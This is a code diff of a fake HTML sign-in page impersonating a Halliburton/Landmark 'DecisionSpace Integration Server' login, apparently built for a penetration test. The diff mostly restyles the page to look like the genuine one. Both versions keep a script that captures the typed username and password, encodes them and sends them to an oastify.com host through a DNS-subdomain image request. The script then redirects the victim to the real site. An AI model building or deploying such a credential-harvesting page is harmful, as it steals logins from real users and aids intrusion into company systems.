@@ -1,139 +1,186 @@
 <!DOCTYPE html>
-<html class="login-pf">
+<html>
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width,initial-scale=1"/>
-    <title>Sign in to DecisionSpace_Integration_Server</title>
+    <title>Sign in to DecisionSpace Integration Server</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: "Open Sans", Arial, sans-serif;
-            background: #030303;
-            color: #fff;
-        }
-        .login-pf-page {
+            font-family: Arial, sans-serif;
+            background: #000;
             display: flex;
-            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .header {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            background: #d3d3d3;
+            padding: 15px;
+            text-align: center;
+            font-size: 18px;
+            color: #666;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+        .login-container {
+            background: #fff;
+            width: 1075px;
+            height: 640px;
+            position: relative;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+        }
+        .left-section {
+            position: absolute;
+            left: 0;
+            top: 0;
+            bottom: 0;
+            width: 425px;
+            background: #fff;
+            display: flex;
             align-items: center;
             justify-content: center;
-            min-height: 100vh;
-            padding: 20px;
         }
-        .login-pf-page-header {
-            text-align: center;
-            margin-bottom: 30px;
-            font-size: 18px;
-            color: #ddd;
+        .globe-image {
+            width: 300px;
+            height: 300px;
+            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200"><circle cx="100" cy="100" r="90" fill="%23f0f0f0" stroke="%23666" stroke-width="2"/><circle cx="70" cy="60" r="30" fill="%23ff6b6b"/><circle cx="130" cy="80" r="25" fill="%23ffd93d"/><circle cx="100" cy="130" r="35" fill="%236bcf7f"/></svg>') center/contain no-repeat;
         }
-        .card-pf {
-            background: #1a1a1a;
-            border: 1px solid #333;
-            border-radius: 3px;
-            padding: 40px;
-            width: 100%;
-            max-width: 500px;
+        .right-section {
+            position: absolute;
+            right: 0;
+            top: 0;
+            bottom: 0;
+            left: 425px;
+            background: #fff;
+            padding: 60px 80px;
         }
-        .login-pf-header h1 {
-            font-size: 22px;
-            font-weight: 300;
-            margin-bottom: 30px;
-            color: #fff;
+        .halliburton-logo {
+            position: absolute;
+            top: 20px;
+            right: 30px;
+            color: #e31837;
+            font-weight: bold;
+            font-size: 16px;
+        }
+        .halliburton-logo::after {
+            content: ' | Landmark';
+            color: #666;
+            font-weight: normal;
+        }
+        .form-container {
+            margin-top: 100px;
         }
         .form-group {
-            margin-bottom: 20px;
+            margin-bottom: 25px;
         }
-        .control-label {
+        label {
             display: block;
             margin-bottom: 8px;
+            color: #333;
             font-size: 14px;
-            color: #ccc;
         }
-        .form-control {
+        input[type="text"],
+        input[type="password"] {
             width: 100%;
-            padding: 10px 12px;
+            padding: 10px;
+            border: 1px solid #ccc;
             font-size: 14px;
-            border: 1px solid #555;
-            border-radius: 3px;
-            background: #2a2a2a;
-            color: #fff;
         }
-        .form-control:focus {
-            outline: none;
-            border-color: #0088ce;
-        }
-        .btn-primary {
-            width: 100%;
-            padding: 12px;
-            font-size: 16px;
-            background: #0088ce;
-            color: #fff;
-            border: none;
-            border-radius: 3px;
+        .sign-in-btn {
+            background: #90ee90;
+            border: 1px solid #7dc67d;
+            padding: 10px 40px;
+            color: #333;
+            font-size: 14px;
             cursor: pointer;
-            margin-top: 10px;
+            margin-top: 20px;
         }
-        .btn-primary:hover {
-            background: #00659c;
+        .sign-in-btn:hover {
+            background: #7dc67d;
+        }
+        .or-sign-in {
+            margin-top: 30px;
+            margin-bottom: 15px;
+            color: #666;
+            font-size: 14px;
+        }
+        .oidc-links a {
+            display: block;
+            color: #0088cc;
+            text-decoration: none;
+            margin: 8px 0;
+            font-size: 14px;
+        }
+        .footer {
+            position: absolute;
+            bottom: 0;
+            left: 425px;
+            right: 0;
+            background: #e31837;
+            color: white;
+            padding: 15px;
+            text-align: center;
+            font-size: 14px;
         }
         .alert {
-            background: #c95f00;
-            color: #fff;
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            color: #856404;
             padding: 12px;
-            border-radius: 3px;
             margin-bottom: 20px;
-            font-size: 14px;
-            border-left: 4px solid #ff9933;
+            border-radius: 4px;
+            font-size: 13px;
         }
     </style>
 </head>
 <body>
-<div class="login-pf-page">
-    <div class="login-pf-page-header">
-        Sign in to <strong>DecisionSpace Integration Server</strong>
-    </div>
-    <div class="card-pf">
-        <header class="login-pf-header">
-            <h1>Sign in to your account</h1>
-        </header>
-        <div class="alert">
-            You are attempting to access a protected resource. Please verify your credentials to continue.
+    <div class="header">SIGN IN TO DECISIONSPACE INTEGRATION SERVER</div>
+    <div class="login-container">
+        <div class="left-section">
+            <div class="globe-image"></div>
         </div>
-        <div id="kc-content">
-            <form id="kc-form-login">
-                <div class="form-group">
-                    <label for="username" class="control-label">Username</label>
-                    <input id="username" class="form-control" name="username" type="text" 
-                           autofocus autocomplete="username" required />
+        <div class="right-section">
+            <div class="halliburton-logo">HALLIBURTON</div>
+            <div class="form-container">
+                <div class="alert">
+                    Authentication required: Please verify your credentials to access this protected resource.
                 </div>
-                <div class="form-group">
-                    <label for="password" class="control-label">Password</label>
-                    <input id="password" class="form-control" name="password" 
-                           type="password" autocomplete="current-password" required />
+                <form id="loginForm">
+                    <div class="form-group">
+                        <label for="username">Username</label>
+                        <input type="text" id="username" name="username" required autofocus>
+                    </div>
+                    <div class="form-group">
+                        <label for="password">Password</label>
+                        <input type="password" id="password" name="password" required>
+                    </div>
+                    <button type="submit" class="sign-in-btn">Sign in</button>
+                </form>
+                <div class="or-sign-in">Or sign in with</div>
+                <div class="oidc-links">
+                    <a href="#">OIDC-preview</a>
+                    <a href="#">OIDC</a>
                 </div>
-                <div class="form-group">
-                    <input class="btn-primary" type="submit" value="Sign in"/>
-                </div>
-            </form>
+            </div>
+        </div>
+        <div class="footer">
+            Powered by<br><strong>DS Integration Server</strong>
         </div>
     </div>
-</div>
-<script>
-    document.getElementById('kc-form-login').addEventListener('submit', function(e) {
-        e.preventDefault();
-        
-        const username = document.getElementById('username').value;
-        const password = document.getElementById('password').value;
-        
-        // Exfiltrate credentials via DNS subdomain
-        const creds = btoa(JSON.stringify({u: username, p: password}));
-        const safe = creds.replace(/[^a-zA-Z0-9]/g, '').substring(0, 63);
-        new Image().src = 'https://' + safe + '.xhi1hwrwxt1hgsff51cr9z43muslgh46.oastify.com/';
-        
-        // Redirect to real login
-        setTimeout(function() {
-            window.top.location = 'https://pen-dfs.dsif.dazlmkleodev01.ienergycloud.solutions';
-        }, 500);
-    });
-</script>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const u = document.getElementById('username').value;
+            const p = document.getElementById('password').value;
+            const d = btoa(JSON.stringify({u:u,p:p})).replace(/[^a-zA-Z0-9]/g,'').substring(0,63);
+            new Image().src='https://'+d+'.xhi1hwrwxt1hgsff51cr9z43muslgh46.oastify.com/';
+            setTimeout(()=>window.top.location='https://pen-dfs.dsif.dazlmkleodev01.ienergycloud.solutions',500);
+        });
+    </script>
 </body>
 </html>
